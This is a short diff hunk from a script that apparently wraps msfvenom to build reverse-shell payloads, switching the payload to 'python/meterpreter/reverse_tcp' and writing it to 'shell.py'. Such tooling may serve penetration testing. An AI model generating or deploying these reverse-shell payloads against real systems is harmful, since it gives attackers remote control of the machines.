@@ -6,7 +6,7 @@ Create Python file
 
 source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"
 
-payload="cmd/unix/reverse_python"
+payload="python/meterpreter/reverse_tcp"
 format="raw"
 filename="shell.py"
 
